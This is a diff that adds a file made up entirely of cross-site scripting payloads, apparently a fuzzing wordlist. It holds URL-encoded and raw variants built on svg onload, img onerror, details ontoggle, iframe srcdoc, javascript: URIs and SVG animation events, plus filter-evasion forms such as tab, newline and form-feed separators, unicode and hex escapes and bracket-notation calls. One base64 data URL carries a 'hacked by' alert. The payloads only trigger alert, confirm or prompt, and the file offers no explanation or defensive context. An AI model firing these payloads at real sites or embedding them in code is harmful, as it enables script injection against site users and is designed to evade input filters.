@@ -1,0 +1,180 @@
+%3Csvg%20onload%3Dalert%281%29%3E
+%3Csvg+onload%3Dalert%281%29%3E
+<svg%09onload=alert(1)>
+<svg%0Aonload=alert(1)>
+%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGFja2VkIGJ5IGthbmcgcmFmYXNoYScpPC9zY3JpcHQ+
+<img%09src=x onerror=alert(1)>
+<img%0Asrc=x onerror=alert(1)>
+%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E
+%3Cdetails+open+ontoggle%3Dalert%281%29%3E
+<details%09open ontoggle=alert(1)>
+<details%0Aopen ontoggle=alert(1)>
+%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E
+%3Ciframe+srcdoc%3D%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E
+<iframe%09srcdoc="<script>alert(1)</script>"></iframe>
+<iframe%0Asrcdoc="<script>alert(1)</script>"></iframe>
+%3C%2Fscript%3E%3Csvg%20onload%3Dalert%281%29%3E
+%3C%2Fscript%3E%3Csvg+onload%3Dalert%281%29%3E
+</script><svg%09onload=alert(1)>
+</script><svg%0Aonload=alert(1)>
+%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3C%2Fscript%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+</script><img%09src=x onerror=alert(1)>
+</script><img%0Asrc=x onerror=alert(1)>
+%3Csvg%3E%3Canimate%20onbegin%3Dalert%281%29%20attributeName%3Dx%20dur%3D1s%3E%3C%2Fanimate%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Canimate+onbegin%3Dalert%281%29+attributeName%3Dx+dur%3D1s%3E%3C%2Fanimate%3E%3C%2Fsvg%3E
+<svg><animate%09onbegin=alert(1) attributeName=x dur=1s></animate></svg>
+<svg><animate%0Aonbegin=alert(1) attributeName=x dur=1s></animate></svg>
+%3Csvg%3E%3Cset%20onbegin%3Dalert%281%29%20attributeName%3Dx%20to%3Dy%3E%3C%2Fset%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Cset+onbegin%3Dalert%281%29+attributeName%3Dx+to%3Dy%3E%3C%2Fset%3E%3C%2Fsvg%3E
+<svg><set%09onbegin=alert(1) attributeName=x to=y></set></svg>
+<svg><set%0Aonbegin=alert(1) attributeName=x to=y></set></svg>
+%3Csvg%3E%3CanimateTransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%3E%3C%2FanimateTransform%3E%3C%2Fsvg%3E
+<svg><animateTransform%09onbegin=alert(1) attributeName=transform></animateTransform></svg>
+<svg><animateTransform%0Aonbegin=alert(1) attributeName=transform></animateTransform></svg>
+%3Csvg%3E%3Cdiscard%20onbegin%3Dalert%281%29%3E%3C%2Fdiscard%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Cdiscard+onbegin%3Dalert%281%29%3E%3C%2Fdiscard%3E%3C%2Fsvg%3E
+<svg><discard%09onbegin=alert(1)></discard></svg>
+<svg><discard%0Aonbegin=alert(1)></discard></svg>
+%3Csvg%3E%3Ca%20onmouseover%3Dalert%281%29%3Ex%3C%2Fa%3E%3C%2Fsvg%3E
+%3Csvg%3E%3Ca+onmouseover%3Dalert%281%29%3Ex%3C%2Fa%3E%3C%2Fsvg%3E
+<svg><a%09onmouseover=alert(1)>x</a></svg>
+<svg><a%0Aonmouseover=alert(1)>x</a></svg>
+%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
+%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3C%2Fmath%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+<math><mtext><table><mglyph><style></math><img%09src=x onerror=alert(1)>
+<math><mtext><table><mglyph><style></math><img%0Asrc=x onerror=alert(1)>
+%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E
+%3Ciframe+src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E
+<iframe%09src=javascript:alert(1)></iframe>
+<iframe%0Asrc=javascript:alert(1)></iframe>
+%3Ciframe%20srcdoc%3D%27%3Csvg%20onload%3Dalert%281%29%3E%27%3E%3C%2Fiframe%3E
+%3Ciframe+srcdoc%3D%27%3Csvg+onload%3Dalert%281%29%3E%27%3E%3C%2Fiframe%3E
+<iframe%09srcdoc='<svg onload=alert(1)>'></iframe>
+<iframe%0Asrcdoc='<svg onload=alert(1)>'></iframe>
+%3Ciframe%20srcdoc%3D%22%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E
+%3Ciframe+srcdoc%3D%22%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E
+<iframe%09srcdoc="<img src=x onerror=alert(1)>"></iframe>
+<iframe%0Asrcdoc="<img src=x onerror=alert(1)>"></iframe>
+%3Csvg%20onload%3D%5Cu0061lert%281%29%3E
+%3Csvg+onload%3D%5Cu0061lert%281%29%3E
+<svg%09onload=\u0061lert(1)>
+<svg%0Aonload=\u0061lert(1)>
+%3Cimg%20src%3Dx%20onerror%3D%5Cu0061lert%281%29%3E
+%3Cimg+src%3Dx+onerror%3D%5Cu0061lert%281%29%3E
+<img%09src=x onerror=\u0061lert(1)>
+<img%0Asrc=x onerror=\u0061lert(1)>
+%3Csvg%20onload%3D%5Cx61lert%281%29%3E
+%3Csvg+onload%3D%5Cx61lert%281%29%3E
+<svg%09onload=\x61lert(1)>
+<svg%0Aonload=\x61lert(1)>
+%3Cimg%20src%3Dx%20onerror%3D%5Cx61lert%281%29%3E
+%3Cimg+src%3Dx+onerror%3D%5Cx61lert%281%29%3E
+<img%09src=x onerror=\x61lert(1)>
+<img%0Asrc=x onerror=\x61lert(1)>
+%3Csvg%2Fonload%3Dalert%281%29%3E
+%3Cimg%2Fsrc%3Dx%2Fonerror%3Dalert%281%29%3E
+%3Csvg%09onload%3Dalert%281%29%3E
+<img%09src=x%09onerror=alert(1)>
+%3Cimg%09src%3Dx%09onerror%3Dalert%281%29%3E
+%3Csvg%0Aonload%3Dalert%281%29%3E
+<img%0Asrc=x%0Aonerror=alert(1)>
+%3Cimg%0Asrc%3Dx%0Aonerror%3Dalert%281%29%3E
+<svg%0Donload=alert(1)>
+%3Csvg%0Donload%3Dalert%281%29%3E
+<img%0Dsrc=x%0Donerror=alert(1)>
+%3Cimg%0Dsrc%3Dx%0Donerror%3Dalert%281%29%3E
+%3Csvg%20onload%3Dalert%601%60%3E
+%3Csvg+onload%3Dalert%601%60%3E
+<svg%09onload=alert`1`>
+<svg%0Aonload=alert`1`>
+%3Cimg%20src%3Dx%20onerror%3Dalert%601%60%3E
+%3Cimg+src%3Dx+onerror%3Dalert%601%60%3E
+<img%09src=x onerror=alert`1`>
+<img%0Asrc=x onerror=alert`1`>
+%3Csvg%20onload%3D%28alert%29%281%29%3E
+%3Csvg+onload%3D%28alert%29%281%29%3E
+<svg%09onload=(alert)(1)>
+<svg%0Aonload=(alert)(1)>
+%3Cimg%20src%3Dx%20onerror%3D%28alert%29%281%29%3E
+%3Cimg+src%3Dx+onerror%3D%28alert%29%281%29%3E
+<img%09src=x onerror=(alert)(1)>
+<img%0Asrc=x onerror=(alert)(1)>
+%3Csvg%20onload%3Dtop%5B%27alert%27%5D%281%29%3E
+%3Csvg+onload%3Dtop%5B%27alert%27%5D%281%29%3E
+<svg%09onload=top['alert'](1)>
+<svg%0Aonload=top['alert'](1)>
+%3Cimg%20src%3Dx%20onerror%3Dtop%5B%27alert%27%5D%281%29%3E
+%3Cimg+src%3Dx+onerror%3Dtop%5B%27alert%27%5D%281%29%3E
+<img%09src=x onerror=top['alert'](1)>
+<img%0Asrc=x onerror=top['alert'](1)>
+%3Csvg%20onload%3Dwindow%5B%27alert%27%5D%281%29%3E
+%3Csvg+onload%3Dwindow%5B%27alert%27%5D%281%29%3E
+<svg%09onload=window['alert'](1)>
+<svg%0Aonload=window['alert'](1)>
+%3Cimg%20src%3Dx%20onerror%3Dwindow%5B%27alert%27%5D%281%29%3E
+%3Cimg+src%3Dx+onerror%3Dwindow%5B%27alert%27%5D%281%29%3E
+<img%09src=x onerror=window['alert'](1)>
+<img%0Asrc=x onerror=window['alert'](1)>
+%3Csvg%20onload%3Dconfirm%28%27xss-search%27%29%3E
+%3Csvg+onload%3Dconfirm%28%27xss-search%27%29%3E
+<svg%09onload=confirm('xss-search')>
+<svg%0Aonload=confirm('xss-search')>
+%3Cimg%20src%3Dx%20onerror%3Dconfirm%28%27xss-search%27%29%3E
+%3Cimg+src%3Dx+onerror%3Dconfirm%28%27xss-search%27%29%3E
+<img%09src=x onerror=confirm('xss-search')>
+<img%0Asrc=x onerror=confirm('xss-search')>
+%3Csvg%20onload%3Dprompt%288%29%3E
+%3Csvg+onload%3Dprompt%288%29%3E
+<svg%09onload=prompt(8)>
+<svg%0Aonload=prompt(8)>
+%3Cimg%20src%3Dx%20onerror%3Dprompt%288%29%3E
+%3Cimg+src%3Dx+onerror%3Dprompt%288%29%3E
+<img%09src=x onerror=prompt(8)>
+<img%0Asrc=x onerror=prompt(8)>
+%3Csvg%3E%3CforeignObject%20onload%3Dconfirm%28%27xss-search%27%29%3E%3C%2FforeignObject%3E%3C%2Fsvg%3E
+%3Csvg%3E%3CforeignObject+onload%3Dconfirm%28%27xss-search%27%29%3E%3C%2FforeignObject%3E%3C%2Fsvg%3E
+<svg><foreignObject%09onload=confirm('xss-search')></foreignObject></svg>
+<svg><foreignObject%0Aonload=confirm('xss-search')></foreignObject></svg>
+%3Csvg%3E%3Cscript%3Econfirm%28%27xss-search%27%29%3C%2Fscript%3E%3C%2Fsvg%3E
+<svg><a%09href=javascript:confirm('xss-search')><text x=20 y=20>click</text></a></svg>
+<svg><a%0Ahref=javascript:confirm('xss-search')><text x=20 y=20>click</text></a></svg>
+<svg><use href=data:image/svg+xml,%3Csvg%20id%3Dx%20onload%3Dconfirm%28%27xss-search%27%29%3E#x></use></svg>
+<svg><use%09href=data:image/svg xml,<svg id=x onload=confirm('xss-search')>#x></use></svg>
+<svg><use%0Ahref=data:image/svg xml,<svg id=x onload=confirm('xss-search')>#x></use></svg>
+%3Cmath%20href%3Djavascript%3Aconfirm%28%27xss-search%27%29%3Ex%3C%2Fmath%3E
+%3Cmath+href%3Djavascript%3Aconfirm%28%27xss-search%27%29%3Ex%3C%2Fmath%3E
+<math%09href=javascript:confirm('xss-search')>x</math>
+<math%0Ahref=javascript:confirm('xss-search')>x</math>
+%3Cdetails%20open%20ontoggle%3Dconfirm%28%27xss-search%27%29%3Ex%3C%2Fdetails%3E
+%3Cdetails+open+ontoggle%3Dconfirm%28%27xss-search%27%29%3Ex%3C%2Fdetails%3E
+<details%09open ontoggle=confirm('xss-search')>x</details>
+<details%0Aopen ontoggle=confirm('xss-search')>x</details>
+%3Cimg%20srcset%3Dx%20onerror%3Dconfirm%28%27xss-search%27%29%3E
+%3Cimg+srcset%3Dx+onerror%3Dconfirm%28%27xss-search%27%29%3E
+<img%09srcset=x onerror=confirm('xss-search')>
+<img%0Asrcset=x onerror=confirm('xss-search')>
+%3Cimg%20src%3Dx%3A%20onerror%3Dconfirm%28%27xss-search%27%29%3E
+%3Cimg+src%3Dx%3A+onerror%3Dconfirm%28%27xss-search%27%29%3E
+<img%09src=x: onerror=confirm('xss-search')>
+<img%0Asrc=x: onerror=confirm('xss-search')>
+%3Cimg%20src%3D%60x%60onerror%3Dconfirm%28%27xss-search%27%29%3E
+%3Cimg+src%3D%60x%60onerror%3Dconfirm%28%27xss-search%27%29%3E
+<img%09src=`x`onerror=confirm('xss-search')>
+<img%0Asrc=`x`onerror=confirm('xss-search')>
+%3Csvg%2Fonload%3Dconfirm%28%27xss-search%27%29%3E
+%3Cimg%2Fsrc%3Dx%2Fonerror%3Dconfirm%28%27xss-search%27%29%3E
+<svg%0Conload=confirm('xss-search')>
+%3Csvg%0Conload%3Dconfirm%28%27xss-search%27%29%3E
+<img%0Csrc=x%0Conerror=confirm('xss-search')>
+%3Cimg%0Csrc%3Dx%0Conerror%3Dconfirm%28%27xss-search%27%29%3E
+<svg%2Fonload=confirm('xss-search')>
+<img%2Fsrc=x%2Fonerror=confirm('xss-search')>
+%3Csvg%20onload%3Dwindow%5B%27confirm%27%5D%28%27xss-search%27%29%3E
+%3Csvg+onload%3Dwindow%5B%27confirm%27%5D%28%27xss-search%27%29%3E
+<svg%09onload=window['confirm']('xss-search')>
+<svg%0Aonload=window['confirm']('xss-search')>
+%3Cimg%20src%3Dx%20onerror%3Dwindow%5B%27confirm%27%5D%28%27xss-search%27%29%3E
